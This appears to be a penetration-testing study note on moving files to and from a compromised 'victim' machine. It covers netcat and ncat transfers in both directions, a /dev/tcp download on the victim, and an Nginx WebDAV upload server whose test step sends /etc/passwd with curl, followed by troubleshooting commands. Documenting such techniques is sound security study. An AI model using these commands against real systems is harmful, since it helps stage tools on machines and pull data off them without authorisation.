```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## Through Tools
### Using NetCat & Ncat
```bash
# 1. [On victim] Start a server on the victim machine, redirecting to our output file
nc -l -p 8000 > file.exe
ncat -l -p 8000 --recv-only > file.exe

# 2. [On local] Upload a file
nc -q 0 <ip> 8000 < file.exe
ncat --send-only <ip> 8000 < file.exe
```
This can be done in reverse (eg. file wall blocks above):
```bash
# 1. [On local] Start a server
sudo nc -l -p 443 -q 0 < file.exe
sudo ncat -l -p 443 --send-only < file.exe

# 2. [On victim] Recieve file
nc <ip> 443 > file.exe
ncat <ip> 443 --recv-only > file.exe
cat < /dev/tcp/<ip>/443 > file.exe
```

### Using HTTP/S Through Nginx
Nginx's modular system tends not to lead to security issues like Apache can, and it's configuration is simpler.
> When allowing HTTP uploads, we need to make sure web shells can't be uploaded and executing. With Apache's PHP module, it likes to execute anything ending with PHP. However, Nginx's equivalent PHP isn't as easy to setup and introduce holes like this.

```Bash
# 1. Create an uploads directory (with a complex name for security reasons)
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# 2. Change the owner
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# 3. Create nginx config file
sudo vi /etc/nginx/sites-available/upload.conf

server {
	listen 9001;
	location /SecretUploadDirectory/ {
		root /var/www/uploads;
		dav_methods PUT;
	}
}

# 4. Symlink to the sites-enabled directory
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# 5. Start nginx
sudo systemctl restart nginx.service

# 6. Test upload a file
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt

# 7. Retrieve file from storage
sudo cat /var/www/uploads/SecretUploadDirectory/users.txt
```

> Make sure to check that directory listing isn't enabled by navigating to http://localhost:9001/SecretUploadDirectory/
> Nginx normally doesn't have this on by default but Apache does.

**Troubleshooting**
```bash
# Tail the logs
tail -2 /var/log/nginx/error.log

# Check to see if a port is being used by something else
ss -lnpt | grep <port>

# Check process using the above port
ps -ef | grep <pid>

# Remove default config if needed (often its because it defaults to port 80 and that might be used by something else)
sudo rm /etc/nginx/sites-enabled/default
```

## Through Code
![[File Transfer Through Code]]

## Linux Specific
![[Operating Systems/Linux/File Transfer|File Transfer]]

## Windows Specific
![[Operating Systems/Windows/File Transfer|File Transfer]]